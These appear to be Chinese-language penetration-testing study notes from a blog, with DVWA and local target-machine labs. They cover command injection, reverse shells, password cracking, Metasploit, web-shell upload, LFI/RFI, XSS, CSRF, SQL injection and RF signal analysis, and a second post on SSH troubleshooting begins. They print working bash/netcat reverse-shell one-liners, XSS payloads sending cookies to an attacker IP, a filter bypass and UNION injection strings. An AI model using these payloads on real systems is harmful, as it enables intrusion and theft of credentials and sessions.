使用Proxy開啟browser<br>  <img src="https://i.imgur.com/dWxhFur.png"><br>  進到project option&gt;MIST&gt;勾選Enable<br>  <img src="https://i.imgur.com/vswHeoq.png"><br>  就可以繼續使用proxy<br>  <img src="https://i.imgur.com/HwXBX1w.png"><br>  將IPor網址執行於瀏覽器中，封包就會被攔截進brower<br>  <img src="https://i.imgur.com/OATh3RT.png"><br>  <br><br></li></ul></li><li><p>暴力破解<br>  <img src="https://i.imgur.com/YuudCcZ.png"><br>  <img src="https://i.imgur.com/kf2mOL5.png"><br>  不同的Attack type有不同模式<br>  sniper:針對字典中設定的值交替順序測試<br>  <img src="https://i.imgur.com/An2qwjw.png"><br>  將存取內容傳到Repeater確認回應結果<br>  <img src="https://i.imgur.com/Tgird85.png"></p><p>  <img src="https://i.imgur.com/nwWHDyM.png"></p></li></ul><br><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>因為沒有針對用戶輸入進行過濾，因此會造成機敏資料外洩、等問題<br>Linux command</p><table><thead><tr><th>Column 1</th><th>Column 2</th></tr></thead><tbody><tr><td>; or &amp;</td><td>不管第一次執行的指令是否成功皆會執行第二個</td></tr><tr><td>&amp;&amp;</td><td>第一個指令失敗不會執行下一個</td></tr><tr><td>I(槓槓符號)</td><td>會把前一個指令的輸出當作下一個指令的輸入</td></tr><tr><td>II(槓槓符號)</td><td>會把前一個指令的輸出當作下一個指令的輸入</td></tr></tbody></table><hr><h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><p>1.Enter IP to get shell</p><p><img src="https://i.imgur.com/GZG7eOA.png"><br>可使用command加入一些linux指令<br><img src="https://i.imgur.com/FI8yUNJ.png"></p><p><img src="https://i.imgur.com/33iCHlV.png"><br>cat去撈 &#x2F;etc&#x2F;shadow<br><img src="https://i.imgur.com/zthZGDt.png"><br>ls -al 查看檔案權限<br><img src="https://i.imgur.com/Fl5HR9S.png"></p><p>ls -al | grep shadow<br>linux<br>&#x2F;etc&#x2F;passwd linux以前會把所有帳密放在裡面<br>&#x2F;etc&#x2F;shadow 現在linux會將它分開</p><h4 id="Reverse-shell"><a href="#Reverse-shell" class="headerlink" title="Reverse shell"></a><em>Reverse shell</em></h4><p>受害者的機器自行連回攻擊者的機器(出來比進去簡單)</p><p><strong>Bash</strong></p><ul><li>Victim: bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</li><li>Attacker:nc -nvlp port</li></ul><p><strong>Netcat</strong></p><ul><li>Victim:nc ip port -e &#x2F;bin&#x2F;bash</li><li>Attacker:nc -nvlp port</li></ul><p><img src="https://i.imgur.com/WHPfdBH.png"></p><p><strong>john the ripper</strong>暴力破解<br>可以參考Linux 的 &#x2F;etc&#x2F;shadow 檔案結構<br><a href="https://blog.gtwang.org/linux/linux-etc-shadow-file-format/">https://blog.gtwang.org/linux/linux-etc-shadow-file-format/</a></p><p>xdg-open &gt;&gt; 呈現file讓你可以直接開啟文件</p><br><p><strong>破解liunx root密碼</strong><br>將passwd和shadow合併 寫入crack中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unshadow passwd shadow &gt; crack</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/vRRh7bK.png"><br>使用john來破解密碼<br><img src="https://i.imgur.com/JiAkG0d.png"></p><p><strong>破解Window root密碼</strong><br>SAM file<br>NTLM hash<br>Net-NTLM 網路上做金鑰交換的地方</p><p><strong>CVE Details</strong><br>可以去追蹤<br>不會有要怎麼利用該漏洞的程式碼<br><strong>Expoitdb</strong><br>可以追蹤漏洞<br>remote code execution(RCE)遠程代碼執行漏洞</p><p><strong>Metasploit</strong><br><a href="https://ithelp.ithome.com.tw/articles/10224527">https://ithelp.ithome.com.tw/articles/10224527</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/fGYsqLW.png"></p><p><img src="https://i.imgur.com/nUGB4m6.png"></p><h2 id="靶機測試-192-168-5-107"><a href="#靶機測試-192-168-5-107" class="headerlink" title="靶機測試(192.168.5.107)"></a>靶機測試(192.168.5.107)</h2><h3 id="NET-config"><a href="#NET-config" class="headerlink" title="NET config"></a>NET config</h3><p>網路要使用橋接介面卡</p><ol><li><p>&lt;資料蒐集&gt;先測試受害機的port有什麼是開啟的<br>使用nmap查看已開啟的port<br><img src="https://i.imgur.com/4YYhxLY.png"><br>可以查看bin裡面有什麼command可以使用<br><img src="https://i.imgur.com/5HngrIj.png"></p></li><li><p>&lt;利用弱點&gt;登入<br>使用SQL Injection去登入</p></li><li><p>使用受害者電腦連回攻擊者電腦<br>可使用下方這兩個去</p></li></ol><ul><li>bash</li><li>netcat</li></ul><ol start="4"><li><p>&lt;資料蒐集&gt;蒐集受害者電腦資訊</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">uname-a</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/W7DQDcI.png"></p></li><li><p>&lt;弱點掃描&gt;使用exploitsdb查詢漏洞<br> <img src="https://i.imgur.com/IajKmAT.png"></p><p> <img src="https://i.imgur.com/BFOaibq.png"></p></li><li><p>在本地電腦開啟apache服務<br> <img src="https://i.imgur.com/6Cimn6A.png"><br> 開啟畫面如下<br> <img src="https://i.imgur.com/TZk5bR6.png"><br> 將需要的檔案放進apache資料夾中，使得之後受害電腦可以下載apache中的資料<br> <img src="https://i.imgur.com/AO8UQ2n.png"><br> <img src="https://i.imgur.com/Pe9lYUr.png"></p></li><li><p>&lt;利用漏洞&gt;在受害者電腦中下載漏洞檔案<br> 使用pwd確認位址指向tmp<br> (由於權限不足因此需要找一個當前權限可以讀寫的位址)<br> 使用wget下載本機開啟的apache<br> <img src="https://i.imgur.com/RdeYP6B.png"><br> <img src="https://i.imgur.com/wVEsi1U.png"><br> 確認權限<br> <img src="https://i.imgur.com/oc9Q7jV.png"></p></li></ol><h3 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h3><p>使用weevely生成backdoor.php<br><img src="https://i.imgur.com/perGeXy.png"><br>將檔案上傳回dvwa的網站<br><img src="https://i.imgur.com/uZlHxZq.png"><br>使用weevely連到該上傳路徑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely http://IP/dvwa/hackable/uploads/backdoor.php pwd(密碼)</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/PkDJBTn.png"><br>查看開主機狀態<br><img src="https://i.imgur.com/L9KupbP.png"></p><p>&lt;中等難度&gt;<br>前端會擋非image會擋<br>先將惡意檔案改成.jpeg</p><p>上傳該檔案，使用burp suite攔截封包，並將封包內檔名更改為php即可<br><img src="https://i.imgur.com/DKwFDBe.png"></p><h3 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI(Local File Inclusion)"></a>LFI(Local File Inclusion)</h3><p>本地文件包含漏洞(LFI)</p><p>敏感檔案:</p><ul><li><strong>&#x2F;etc&#x2F;passwd</strong></li><li><strong>&#x2F;var&#x2F;log&#x2F;auth.log</strong><ul><li>紀錄哪些user連這台機器</li></ul></li><li><strong>&#x2F;var&#x2F;log&#x2F;apacke2&#x2F;access.log&#x2F;error.log</strong><ul><li>有出現過哪些錯誤訊息</li></ul></li><li><strong>..&#x2F;..&#x2F;..&#x2F;</strong><ul><li>可以去翻他有那些檔案</li></ul></li><li><strong>%WINDIR%\win.ini</strong><ul><li>win設定檔，可以看config</li></ul></li></ul><p>可以在?page&#x3D;後面放入<strong>絕對路徑</strong>來查找資料<br><img src="https://i.imgur.com/KLw7zdD.png"></p><p><img src="https://i.imgur.com/2pHxd91.png"></p><p><img src="https://i.imgur.com/QGulfsK.png"></p><h3 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI(Remote File Inclusion)"></a>RFI(Remote File Inclusion)</h3><p>有RFI漏洞<br>需要開啟funcion:</p><ul><li>allow_url_fopen</li><li>allow_url_include</li></ul><p><img src="https://i.imgur.com/DDVoXPL.png"></p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>跨腳本攻擊(Cross Site Scripting)<br>攻擊對象為user端，非server端</p><p>漏洞利用條件</p><ul><li>伺服器對用戶提交數據過濾不夠嚴謹</li><li>使用社交工程讓受害者點擊觸發<br>影響:</li><li>重定向(掛馬)不應該被倒到的網站</li><li>盜取cookie</li><li>釣魚<br>類型:</li><li>反射型:返回腳本並由user要去點擊才會中招</li><li>儲存型:js code 存在server端，不管user有沒有點擊，都會觸發。</li></ul><p>下js code</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;call 911&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/T3rDDKJ.png"><br><img src="https://i.imgur.com/oOGulM2.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/191wpbd.png"><br><img src="https://i.imgur.com/0T1ttyT.png"></p><p>從user那邊偷到訊息傳到攻擊者端<br>監聽80 port<br>輸入js code 連到攻擊者IP回傳cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;new image().src=&quot;http://ip/output=&quot;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Q0T1jW9.png"></p><p>&lt;中等難度&gt;<br>過濾掉script，則可以使用大小寫來混淆他<br>ex.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCripT&gt;new image().src=&quot;http://ip/output=&quot;+document.cookie;&lt;/sCripT&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/4Y4hqwD.png"></p><p><img src="https://i.imgur.com/e26A9bc.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>XSS stored</p><p><img src="https://i.imgur.com/gJi4QzR.png"></p><p><img src="https://i.imgur.com/QEBAcB9.png"></p><h2 id="靶機測試2-192-168-0-182"><a href="#靶機測試2-192-168-0-182" class="headerlink" title="靶機測試2(192.168.0.182)"></a>靶機測試2(192.168.0.182)</h2><ol><li>蒐集資料<br>使用dirb蒐集網頁資料</li></ol><p>使用nmap -A 查看該主機有甚麼Port是開啟的<br><img src="https://i.imgur.com/M19pxyW.png"><br>其中可以朝samba掃描&#x2F;攻擊<br>(samba的洞挺多的)</p><ol start="2"><li><p>開啟msfconsolse<br><img src="https://i.imgur.com/zXZNme2.png"></p></li><li><p>Search samba漏洞<br><img src="https://i.imgur.com/4FDBxJQ.png"></p></li><li><p>編譯漏洞腳本<br><img src="https://i.imgur.com/4LaDpTB.png"></p></li><li><p>執行漏洞腳本<br><img src="https://i.imgur.com/97zdWV8.png"><br>(即可連進去取得root)</p></li></ol><p>要怎麼維持連線程序????<br><strong>越貼近使用者行為越好越難發現</strong><br>1.建一個新的帳號<br>2.爆破它其他的帳號密碼<br>3.塞一個服務 (但有可能會被AD斷掉)<br>4.建一個連線回到自己主機 (但有可能會被AD斷掉)</p><p>How To Create a Sudo User in Linux?<br><a href="https://www.digitalocean.com/community/tutorials/how-to-create-a-sudo-user-on-ubuntu-quickstart">https://www.digitalocean.com/community/tutorials/how-to-create-a-sudo-user-on-ubuntu-quickstart</a></p><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>攔截修改密碼的頁面<br><img src="https://i.imgur.com/FUBku23.png"></p><p>複製封包的URI<br><img src="https://i.imgur.com/1LTXzYP.png"></p><p>執行URI即可更改密碼<br><img src="https://i.imgur.com/POuyWXz.png"><br>將URI拿去縮短網址就能夠更加隱蔽</p><h3 id="XSS-CSRF-組合技"><a href="#XSS-CSRF-組合技" class="headerlink" title="XSS+CSRF 組合技"></a>XSS+CSRF 組合技</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;new Image().src=&quot;更改密碼的URI&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>反射型:點到這個圖片就會被更改</li><li>儲存型:登入後帶著cookie瀏覽到特定圖片就會被更改</li></ul><h3 id="SQL-Injection-脫庫"><a href="#SQL-Injection-脫庫" class="headerlink" title="SQL Injection(脫庫)"></a>SQL Injection(脫庫)</h3><p>server端並未經過過濾使用輸入SQL語法進行解析並將結果返回<br>SQL基礎使用:</p><ul><li>Select DB</li><li>Select table</li><li>Select column</li><li>Data</li></ul><p>登入DB</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -h IP</span><br><span class="line">show DB;</span><br><span class="line">use dvwa;</span><br><span class="line">show tables;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/aK34Mju.png"><br><img src="https://i.imgur.com/pmUsGxs.png"></p><p>select<br><img src="https://i.imgur.com/2ljNhS8.png"><br><img src="https://i.imgur.com/dmWdah5.png"></p><p>Information Schema</p><ul><li>Information_schema.schemata 所有db</li><li>Information_schema.tables 所有table</li><li>Information_schema.columns 所有的欄位</li></ul><p><img src="https://i.imgur.com/Adjm06U.png"><br><img src="https://i.imgur.com/f6uOTKJ.png"></p><p>輸入1會產生ID1的資訊<br><img src="https://i.imgur.com/kpFZTul.png"><br>因此可以使用select語法輸入所有的db</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &#x27; union select 1, schema_name from information_schema.schemata # </span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/iQecQTk.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &#x27; union select 1, table_name from information_schema.tables # </span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/O5Ba3HO.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &#x27; union select 1, table_name from information_schema.tables where table_name=&#x27;dvwa&#x27;# </span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/sLCOQpN.png"></p><p><img src="https://i.imgur.com/mRMPxDH.png"></p><p><img src="https://i.imgur.com/9QEBR9x.png"></p><hr><h2 id="好用資源"><a href="#好用資源" class="headerlink" title="好用資源"></a>好用資源</h2><ul><li>Payload All The Things<br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a></li><li>GTFObins: 各種Reverse Shell<br><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li><li>XSS Bypass Filter<br><a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</a></li></ul><hr><h2 id="RF-滲透測試"><a href="#RF-滲透測試" class="headerlink" title="RF 滲透測試"></a>RF 滲透測試</h2><p>安裝基本套件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gnuradio </span><br><span class="line">sudo apt-get install gr-osmosdr</span><br><span class="line">sudo apt-get install rtl-sdr</span><br><span class="line">rtl_test</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Dpat9WW.png"></p><p><strong>開啟osmocom_fft</strong><br>osmocom_fft<br><img src="https://i.imgur.com/Ewe4E1Y.png"></p><h3 id="通訊概論"><a href="#通訊概論" class="headerlink" title="通訊概論"></a>通訊概論</h3><p>訊號：</p><ul><li>類比訊號(陸譯:模擬訊號):根據震幅的改變而產生的訊號，可以用來乘載訊號<ul><li>赫茲(Hz):每秒震盪幾次</li></ul></li><li>數位訊號:表示為0or1，不是用來乘載訊息的</li></ul><p>頻率:每秒震盪幾次，每秒周期數<br>頻寬:用來描述頻率的範圍，又稱為帶寬</p><p>fft 演算法:</p><ul><li>中心頻率(Center Frequency):(f max + f min)&#x2F;2</li><li>頻寬(Bandwideth, channel width): |f max- f min|</li></ul><p>頻譜分配:<br><img src="https://i.imgur.com/YFYcJnm.png"></p><p>ISM頻段:</p><ul><li>無需使用執照與向政府繳交費用</li><li>2.4GHz, 868Mhz</li></ul><p>Sub -1G頻段:</p><ul><li>小於1GHz的頻段被稱為Sub -1GHz</li></ul><p>發收端:調變-&gt;訊息X載波&#x3D;訊號<br>接收端:解調變</p><ul><li>類比調變<ul><li>頻率調變(FM):利用訊號頻率密度來表示</li><li>振幅調變(AM):利用訊號震幅高低表示</li><li>相位調變(PM):利用不同的相位(角度)來表示</li></ul></li><li>數位調變<ul><li>振幅偏移調變(ASK)</li><li>頻率偏移調變(FSK)</li><li>相位偏移調變(PSK)</li><li>正交分多工調變(OFDM) ex.WiFi</li></ul></li><li>比較<br>  <img src="https://i.imgur.com/dY7rAqQ.jpg"></li></ul><p>單工:純接收、純發射<br>半雙工:接收發射同時間下能擇一 ex.無線電<br>雙工:同時間下能透發射&amp;接收 ex.手機</p><p>電流:<br>導體上的電流 - 發射機(Tx) -&gt; air interface -&gt; 接收機(Rx) - 導體上的電流</p><p>Wireless IC Dongle<br><img src="https://i.imgur.com/1ZEd9lh.jpg"><br>SDR Flatforms<br><img src="https://i.imgur.com/W28jivl.jpg"></p><p>Wireless IC Dongle VS SDR Flatforms</p><ul><li>Wireless IC Dongle:收到訊號以後，將已解調訊號傳至電腦</li><li>SDR Flatforms:收到訊號以後，將未解調訊號傳至電腦</li></ul><p>增益VS損耗</p><ul><li>增益(Gain):輸出的訊號&gt;輸入的訊號 ,根據質量守恆定理，訊號不會無緣無故變大，因此會經過電流加大訊號</li><li>損耗(Loss):輸入的訊號&gt;輸出的訊號 ,透過發熱進行能量守恆的轉換</li></ul><p>使用分貝當作比較的條件</p><p>採樣定理:<br>將一個類比訊號經過採樣轉換成一個數位訊號，需要用幾個點表示一個波?</p><blockquote><p>&lt;fs採樣率  f採樣頻率 B頻寬&gt;</p></blockquote><ol><li>低通採樣定理:採樣率至少為採樣頻率的兩倍<br> fs &#x3D; 2 x f</li><li>帶通採樣定理:採樣率至少為頻寬的兩倍<br> fs &#x3D; 2 x B</li></ol><ul><li><p>抽取(Decimation):降低採樣率</p></li><li><p>內插(Interpolation):提高採樣率</p></li><li><p>混疊現象(Aliasing Effect):會發生在訊號中心頻率+-採樣率的頻率</p></li></ul><p>匹配:</p><ul><li>射頻訊號 阻抗 50 Ω(Ohm）</li><li>視頻訊號 阻抗 75 Ω(Ohm)</li><li>匹配不良:射頻信號會有反射問題，嚴重的話可能會燒掉</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gnuradio-companion</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/oKM0usX.png"></p><p>圖中每一個都是功能模組相連<br>NBFM Receive為解調訊號的Seceive，沒有它就不會work<br><img src="https://i.imgur.com/03kHTTz.png"></p><p>開啟一個新的流程圖<br>File&gt;New&gt;WX GUI<br><img src="https://i.imgur.com/zvMNJRR.png"><br>區域介紹<br><img src="https://i.imgur.com/o05gLr3.png"><br>RTL-SDR參數設定<br><img src="https://i.imgur.com/UCRfAXd.png"><br>可以更改變數，使所有和samp_rate之變數全部更改<br><img src="https://i.imgur.com/GgUS5UZ.png"></p><p>將rtl收到的所有訊號存到file<br><img src="https://i.imgur.com/bKGy7Eq.png"><br>給file_sink儲存的位址<br><img src="https://i.imgur.com/gAJTMBu.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inspectrum &lt;file&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Jf8QIdk.png"></p><h3 id="元件"><a href="#元件" class="headerlink" title="元件"></a>元件</h3><p>有源:需要電源運作<br>無源:不須電源運作</p><ul><li><p>放大器:</p><ul><li>三種屬性:增益、噪聲係數、線性<ul><li>Gain:使用dB表示</li><li>噪聲係數:使用dB表示</li><li>線性:失真程度</li></ul></li><li>三類:低噪音、高功率、其他</li></ul></li><li><p>天線</p><ul><li>天線:接收訊號與發射訊號<ul><li>全向天線:全樣都有</li><li>指向天線:只有一個角度</li><li>增益天線:捨去電磁場﹑非功率增益而是方向增益</li><li>主動天線:必含功率增益</li></ul></li><li>頻率:決定天線的大小</li><li>傳播方向:決定天性的形狀<ul><li>全向:全樣都有</li><li>指向:只有一個角度</li></ul></li><li>功率:決定天線的大小</li></ul></li><li><p>濾波器</p><ul><li>已”頻率”劃分不同訊號<br>  <img src="https://i.imgur.com/A44cWOA.jpg"></li><li>頻率響應:超過他的憑率較果會下降</li><li>過濾你不要的頻率</li></ul></li><li><p>混頻器:</p><ul><li>改變訊號頻率，但保持其他特性，也就是做調變的功能</li><li>通常混頻器後面會接一個濾波器</li><li>比較沒辦法數位化</li></ul></li><li><p>振盪器:</p><ul><li>比較沒辦法數位化</li></ul></li><li><p>元件比較<br>  <img src="https://i.imgur.com/sQIJs7D.jpg"></p></li><li><p>元件溝通</p><ul><li><p>發射機<br>  <img src="https://i.imgur.com/DrcyGdD.jpg"></p></li><li><p>接收機</p></li></ul></li></ul><h3 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h3><p>流程:</p><ol><li>Find the signal</li><li>Capture the signal</li><li>Analyze the signal</li></ol><h4 id="Analyze-the-signal"><a href="#Analyze-the-signal" class="headerlink" title="Analyze the signal:"></a>Analyze the signal:</h4><ul><li>前導碼(Preamble):告訴雙方要準備連線了<ul><li>常見的的:0xaaaa, 0x5555</li></ul></li><li>同步碼(Sync Word):我現在開始要傳資料了喔!<ul><li>堂見的:0xd391</li></ul></li></ul><p><img src="https://i.imgur.com/naYlFWK.png"></p><p><img src="https://i.imgur.com/LzH7Dfk.png"></p><blockquote><p>FFT size:調整頻率軸縮放<br>Zoom:調整時間<br>Power Max:調整訊號顯示<br>Power Min:調整背景噪音顯示<br>調整Zoom &amp; FFT size<br><img src="https://i.imgur.com/COKLijI.jpg"></p></blockquote><p><img src="https://i.imgur.com/GEQlM5t.png"><br>讓紅線貼近訊號<br><img src="https://i.imgur.com/MNNMpqH.png"></p><p>可以看見下方的振幅(綠色的線)<br><img src="https://i.imgur.com/aEW6fvE.jpg"></p><h4 id="urh-訊號分析"><a href="#urh-訊號分析" class="headerlink" title="urh 訊號分析"></a>urh 訊號分析</h4><p><img src="https://i.imgur.com/cmzuK6s.png"><br>analysis<br><img src="https://i.imgur.com/aGQYkkS.png"></p><h3 id="分析練習"><a href="#分析練習" class="headerlink" title="分析練習"></a>分析練習</h3><h4 id="Doorball練習"><a href="#Doorball練習" class="headerlink" title="Doorball練習"></a>Doorball練習</h4><p>frequency 240~960MHz</p><p>modulation OOK(One of Key 是ASK的一種) or ASK</p><p>preamble size 0<br>preamble 0x55 or 0xaa</p><p>Sync size 32bits<br>Sync Word 0x80000000</p><p>Packet Structure:<br>Sync+(0x8eee8ee88eee888e888888e88)*39+0x8eee8ee88eee888e888888e8</p><p>了解封包結構以後，接下來就是可以去模擬一個類似的packet structure回傳給IOT裝置，如果原先的訊號沒有過濾需要的值，也就是說在Data的部分更改長度or更改內容，IOT會不會爆掉</p><p>PWM</p><ul><li>高高低1</li><li>高低低0</li><li>PWM 逼碼常與ASK進行調變</li><li>bit rate&#x3D; baud rate &#x2F; 3 &#x3D; symbol rate &#x2F; 3<br>Manchester慢測試</li><li>高電壓到低電壓是0</li><li>低電壓到高電壓是1</li><li>bit rate &#x3D; baud rate &#x2F; 2 &#x3D; symbol &#x2F;2</li></ul><h4 id="Unknow練習"><a href="#Unknow練習" class="headerlink" title="Unknow練習"></a>Unknow練習</h4><ul><li><p>Identify Application</p><ul><li>remote controlled car application</li></ul></li><li><p>Identify Modulation Type</p><ul><li>ASK&#x2F;OOK</li></ul></li><li><p>Identify Preamble</p><ul><li>No</li></ul></li><li><p>Identify Sync Word</p><ul><li>4*W2 or W2都行</li></ul></li><li><p>Identify Encoding</p><ul><li>NRZ (常與ASK做調變 but this case 例外)</li></ul></li><li><p>Identify 4 Signal Function</p><ul><li><img src="https://i.imgur.com/cZLi4qY.png"></li><li>上 w2x4 + w1x10</li><li>下 w2x4 + w1x40</li><li>右 w2x4 + w1x64</li><li>左 w2x4 + w1x58</li></ul></li><li><p>Identify Packet Structure<br><img src="https://i.imgur.com/3oTSfia.png"><br><img src="https://i.imgur.com/GokBAQ8.png"></p></li></ul><h2 id="apache2-server"><a href="#apache2-server" class="headerlink" title="apache2 server"></a>apache2 server</h2><p><strong>Reference</strong><br><a href="https://ubuntu.com/tutorials/install-and-configure-apache#2-installing-apache">https://ubuntu.com/tutorials/install-and-configure-apache#2-installing-apache</a><br><a href="https://www.cyberciti.biz/faq/star-stop-restart-apache2-webserver/">https://www.cyberciti.biz/faq/star-stop-restart-apache2-webserver/</a></p><ul><li>install<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install apache2</span><br></pre></td></tr></table></figure></li><li>start<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># sudo /etc/init.d/apache2 start</span><br></pre></td></tr></table></figure></li><li>restart<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># sudo /etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure></li><li>stop<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># sudo /etc/init.d/apache2 stop</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Penetration Testing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>📑 DMS_Troubleshooting 筆記</title>
      <link href="/posts/5728fae1.html"/>
      <url>/posts/5728fae1.html</url>
      
        <content type="html"><![CDATA[<h2 id="Network-Debug"><a href="#Network-Debug" class="headerlink" title="Network Debug"></a>Network Debug</h2><ul><li>若你SSH不到Server，你會怎麼做?<ul><li>先Ping Server看通不通</li><li>若還是錯誤則是根據SSH連線出現的錯誤訊息來做故障排除</li><li><strong>Unable to open connection to example.com Host does not exist</strong><ul><li>檢查是否可透過 <code>ping</code> 來去解析目標server域名</li><li>若使用hostname則改用ip試試看(交替試試看)</li></ul></li><li><strong>Connection timed out</strong>: client試圖與SSH Server建立network socket，但server在時間內沒能回應<ul><li>檢查是否正在使用Port 22，或自定義的port口來進行連接<ul><li><code>$ netstat -all</code></li></ul></li><li>檢查firewall規則是否有阻擋來自特定ip或port 22的進入流量<ul><li><code>$ iptables --list</code></li><li>看是不是有設定<strong>Drop</strong> method</li><li>或是port 22 沒有被加進allow connection內</li></ul></li></ul></li><li><strong>Connection Refused</strong>: 請求正在路由到host，但host沒能接收到請求<ul><li>檢查是否正在使用Port 22，或自定義的port口來進行連接</li><li>檢查firewall規則是否有阻擋來自特定ip或port 22的進入流量<ul><li>看是不是有設定<strong>Drop</strong> method</li><li>或是port 22 沒有被加進allow connection內</li><li>檢查服務當前是否正在運行並綁定到預期port上</li></ul></li></ul></li><li>如何檢查防火牆?<ul><li><code>iptable -nL</code></li><li><code>ufw status</code></li></ul></li><li>檢查SSH狀態<ul><li>舊版本的OS可以使用 <code>service</code><ul><li><code>service ssh status</code></li><li>若結果有正確顯示process id則代表正確運行</li><li>若沒有運行則會顯示，ssh stop&#x2F;waiting 之類的訊息</li><li>可透過 <code>service ssh start</code> 開啟服務</li></ul></li><li>新版本的OS可以使用 <code>systemctl</code><ul><li><code>systemctl status sshd</code></li><li>若正確運行，則會顯示active或running</li><li>若沒再運行則會顯示inactive</li><li>可透過 <code>systemctl start sshd</code>來開啟服務</li></ul></li></ul></li><li>檢查SSH Service Port<ul><li>有兩種方式檢查SSH是跑在哪個port上<ul><li>第一個是去查看 ssh 設定檔<ul><li><code>grep Port /etc/ssh/sshd_config</code></li></ul></li><li>若你知道ssh服務正在運行，則可透過 <code>ss</code>指令查看是否跑在預期的port上<ul><li><code>ss -plnt</code> &#x2F;&#x2F;是從kernel中query出socket資訊</li><li><code>netstat -plnt</code></li></ul></li></ul></li></ul></li></ul></li><li>導致SSH連線失敗的原因可能會有哪些?<ul><li><strong>ssh公鑰沒有被inject到Server上</strong><ul><li>我們在本地端產生ssh key pair，並可能透過passphase保護私鑰</li><li>將ssh公鑰注入到遠端server上的 <strong>~&#x2F;.ssh&#x2F;authorized_keys</strong> 路徑</li><li>而有時候常會跳出 <strong>Permission 